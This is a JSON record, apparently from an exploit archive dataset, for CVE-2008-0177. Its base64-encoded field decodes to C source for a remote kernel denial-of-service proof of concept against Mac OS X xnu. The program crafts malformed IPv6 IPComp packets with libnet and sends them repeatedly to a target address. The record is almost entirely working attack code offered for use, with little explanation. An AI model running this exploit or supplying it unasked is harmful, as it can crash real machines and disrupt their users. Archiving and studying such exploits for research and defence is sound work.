{
    "source": "exploit-database", 
    "exploit": "LyogeG51LWlwdjYtaXBjb21wLmMNCiAqDQogKiBDb3B5cmlnaHQgKGMpIDIwMDggYnkgPG11LWJAZGlnaXQtbGFicy5vcmc+DQogKg0KICogQXBwbGUgTUFDT1MgWCB4bnUgPD0gMTIyOC4zLjEzIGlwdjYtaXBjb21wIHJlbW90ZSBrZXJuZWwgRG9TIFBPQw0KICogYnkgbXUtYiAtIFN1biAyNCBGZWIgMjAwOA0KICoNCiAqIC0gVGVzdGVkIG9uOiBBcHBsZSBNQUNPUyBYIDEwLjUuMSAoeG51LTEyMjguMC4yfjEvUkVMRUFTRV9JMzg2KQ0KICogICAgICAgICAgICAgIEFwcGxlIE1BQ09TIFggMTAuNS4yICh4bnUtMTIyOC4zLjEzfjEvUkVMRUFTRV9JMzg2KQ0KICoNCiAqIGlwY29tcDZfaW5wdXQgZG9lcyBub3QgdmVyaWZ5IHRoZSBzdWNjZXNzIG9mIHRoZSBmaXJzdCBjYWxsDQogKiB0byBtX3B1bGxkb3duIChtIC0+IG1kIHR5cG8/KS4NCiAqDQogKiAgICAgICAgIG1kID0gbV9wdWxsZG93bihtLCBvZmYsIHNpemVvZigqaXBjb21wKSwgTlVMTCk7DQogKiAgICAgICAgIGlmICghbSkgew0KICogLT4NCiAqICAgICAgICAgbWQgPSBtX3B1bGxkb3duKG0sIG9mZiwgc2l6ZW9mKCppcGNvbXApLCBOVUxMKTsNCiAqICAgICAgICAgaWYgKCFtZCkgew0KICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoYnNkL25ldGluZXQ2L2lwY29tcF9pbnB1dC5jKQ0KICoNCiAqIGN1cmlvc2x5IHRoZSBzYW1lIGJ1ZyBleGlzdHMgaW4gaXBjb21wNF9pbnB1dCwgYnV0IGFuIGV4cGxpY2l0DQogKiBjaGVjayBpcyBtYWRlIHRvIGVuc3VyZSB0aGVyZSBpcyBlbm91Z2ggc3BhY2UgZm9yIHRoZSBzdHJ1Y3QgaXBjb21wLg0KICoNCiAqIE5vdGU6IGJ1ZyBpbmRlcGVuZGVudGx5IGZvdW5kIGJ5IFNob2ljaGkgU2FrYW5lIG9mIHRoZSBLQU1FIHByb2plY3QuDQogKiAgICAgICAoRnJlZUJTRCA1LjUsIDQuOS4wICYgTmV0QlNEIDMuMSBhbHNvIHZ1bG5lcmFibGUpDQogKiAgICAgICAgICAoaHR0cDovL3d3dy5rYi5jZXJ0Lm9yZy92dWxzL2lkLzExMDk0NykNCiAqICAgICAgICAgIChodHRwOi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC8yNzY0MikNCiAqICAgICAgICAgIChodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUuY2dpP25hbWU9Q1ZFLTIwMDgtMDE3NykNCiAqDQogKiAgICAtIFByaXZhdGUgU291cmNlIENvZGUgLURPIE5PVCBESVNUUklCVVRFIC0NCiAqIGh0dHA6Ly93d3cuZGlnaXQtbGFicy5vcmcvIC0tIERpZ2l0LUxhYnMgMjAwOCFAJCENCiAqLw0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPGlmYWRkcnMuaD4NCiNpbmNsdWRlIDxsaWJuZXQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCiNkZWZpbmUgSVBWNl9JTlRFUkZBQ0UgICAgImV0aDAiDQojZGVmaW5lIElQVjZfU1JDX09GRlNFVCAgIDgNCiNkZWZpbmUgSVBWNl9EU1RfT0ZGU0VUICAgMjQNCg0KI2RlZmluZSBIQU1NRVJfTlVNICAgICAgICA4DQoNCnN0YXRpYyB1bnNpZ25lZCBjaGFyIHBidWZbXSA9IA0KICAiXHg2MCINCiAgIlx4MDBceDAwXHgwMCINCiAgIlx4MDBceDAwIiAgICAgIC8qIHBsZW4gPSAwICAgICAgICAgICAqLw0KICAiXHg2YyIgICAgICAgICAgLyogbnh0X2hkciA9IElQQ29tcCAgICovDQogICJceDY2Ig0KICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCiAgIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiOw0KDQpzdGF0aWMgaW50DQpnZXRfbG9jYWxpcCAoY2hhciAqaWZfbmFtZSwgdW5zaWduZWQgaW50ICppcDZfYWRkcikNCnsNCiAgc3RydWN0IGlmYWRkcnMgKmlmYV9oZWFkOw0KICBpbnQgcmVzdWx0Ow0KDQogIHJlc3VsdCA9IC0xOw0KICBpZiAoZ2V0aWZhZGRycyAoJmlmYV9oZWFkKSA9PSAwKQ0KICAgIHsNCiAgICAgIHN0cnVjdCBpZmFkZHJzICppZmFfY3VyOw0KDQogICAgICBpZmFfY3VyID0gaWZhX2hlYWQ7DQogICAgICBmb3IgKGlmYV9jdXIgPSBpZmFfaGVhZDsgaWZhX2N1cjsgaWZhX2N1ciA9IGlmYV9jdXItPmlmYV9uZXh0KQ0KICAgICAgICB7DQogICAgICAgICAgaWYgKGlmYV9jdXItPmlmYV9uYW1lICE9IE5VTEwgJiYgaWZhX2N1ci0+aWZhX2FkZHIgIT0gTlVMTCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgaWYgKHN0cmNtcCAoaWZfbmFtZSwgKGNoYXIgKikgaWZhX2N1ci0+aWZhX25hbWUpICE9IDAgfHwNCiAgICAgICAgICAgICAgICAgIGlmYV9jdXItPmlmYV9hZGRyLT5zYV9mYW1pbHkgIT0gQUZfSU5FVDYgfHwNCiAgICAgICAgICAgICAgICAgICEoaWZhX2N1ci0+aWZhX2ZsYWdzICYgSUZGX1VQKSkNCiAgICAgICAgICAgICAgICBjb250aW51ZTsNCg0KICAgICAgICAgICAgICBtZW1jcHkgKGlwNl9hZGRyLA0KICAgICAgICAgICAgICAgICAgICAgICYoKChzdHJ1Y3Qgc29ja2FkZHJfaW42ICopIGlmYV9jdXItPmlmYV9hZGRyKS0+c2luNl9hZGRyKSwNCiAgICAgICAgICAgICAgICAgICAgICBzaXplb2YgKGludCkgKiA0KTsNCiAgICAgICAgICAgICAgcmVzdWx0ID0gMDsNCiAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgZnJlZWlmYWRkcnMgKGlmYV9oZWFkKTsNCiAgICB9DQoNCiAgcmV0dXJuIChyZXN1bHQpOw0KfQ0KDQppbnQNCm1haW4gKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCiAgY2hhciBlcnJidWZbTElCTkVUX0VSUkJVRl9TSVpFXSwgaXA2X2J1ZlsxMjhdOw0KICB1bnNpZ25lZCBpbnQgaSwgaXA2X2FkZHJbNF07DQogIGxpYm5ldF90ICpsbnNvY2s7DQoNCiAgcHJpbnRmICgiQXBwbGUgTUFDT1MgWCB4bnUgPD0gMTIyOC4zLjEzIGlwdjYtaXBjb21wIHJlbW90ZSBrZXJuZWwgRG9TIFBvQ1xuIg0KICAgICAgICAgICJieTogPG11LWJAZGlnaXQtbGFicy5vcmc+XG4iDQogICAgICAgICAgImh0dHA6Ly93d3cuZGlnaXQtbGFicy5vcmcvIC0tIERpZ2l0LUxhYnMgMjAwOCFAJCFcblxuIik7DQoNCiAgaWYgKGFyZ2MgPCAyKQ0KICAgIHsNCiAgICAgIGZwcmludGYgKHN0ZGVyciwgIlVzYWdlOiAlcyA8ZHN0IGlwdjY+XG4iLCBhcmd2WzBdKTsNCiAgICAgIGV4aXQgKEVYSVRfRkFJTFVSRSk7DQogICAgfQ0KDQogIGlmIChnZXRfbG9jYWxpcCAoSVBWNl9JTlRFUkZBQ0UsDQogICAgICAgICAgICAgICAgICAgKHVuc2lnbmVkIGludCAqKSAmcGJ1ZltJUFY2X1NSQ19PRkZTRVRdKSA8IDApDQogICAgew0KICAgICAgZnByaW50ZiAoc3RkZXJyLCAiKiBnZXRfbG9jYWxpcCgpIGZhaWxlZFxuIik7DQogICAgICBleGl0IChFWElUX0ZBSUxVUkUpOw0KICAgIH0NCg0KICBpZiAoaW5ldF9wdG9uIChBRl9JTkVUNiwgYXJndlsxXSwgaXA2X2FkZHIpIDw9IDApDQogICAgew0KICAgICAgZnByaW50ZiAoc3RkZXJyLCAiKiBpbmV0X3B0b24oKSBmYWlsZWRcbiIpOw0KICAgICAgZXhpdCAoRVhJVF9GQUlMVVJFKTsNCiAgICB9DQogIG1lbWNweSAoJnBidWZbSVBWNl9EU1RfT0ZGU0VUXSwgaXA2X2FkZHIsIHNpemVvZiBpcDZfYWRkcik7DQoNCiAgbG5zb2NrID0gbGlibmV0X2luaXQgKExJQk5FVF9SQVc2X0FEViwgTlVMTCwgZXJyYnVmKTsNCiAgaWYgKGxuc29jayA9PSBOVUxMKQ0KICAgIHsNCiAgICAgIGZwcmludGYgKHN0ZGVyciwgIiogbGlibmV0X2luaXQoKSBmYWlsZWQ6ICVzXG4iLCBlcnJidWYpOw0KICAgICAgZXhpdCAoRVhJVF9GQUlMVVJFKTsNCiAgICB9DQoNCiAgaW5ldF9udG9wIChBRl9JTkVUNiwgJnBidWZbSVBWNl9TUkNfT0ZGU0VUXSwgaXA2X2J1Ziwgc2l6ZW9mIGlwNl9idWYpOw0KICBwcmludGYgKCIqIGxvY2FsIGlwdjYgJXMuLi5cbiIsIGlwNl9idWYpOw0KICBwcmludGYgKCIqIGF0dGFja2luZyAlcy4uLiIsIGFyZ3ZbMV0pOw0KICBmb3IgKGkgPSAwOyBpIDwgSEFNTUVSX05VTTsgaSsrKQ0KICAgIGxpYm5ldF93cml0ZV9yYXdfaXB2NiAobG5zb2NrLCBwYnVmLCBzaXplb2YgcGJ1ZiAtIDEpOw0KICBwcmludGYgKCJkb25lXG4iKTsNCg0KICByZXR1cm4gKEVYSVRfU1VDQ0VTUyk7DQp9DQoNCi8vIG1pbHcwcm0uY29tIFsyMDA4LTAyLTI2XQ==", 
    "filename": "platforms/multiple/dos/5191.c", 
    "id": "5191", 
    "cves": [
        "CVE-2008-0177"
    ]
}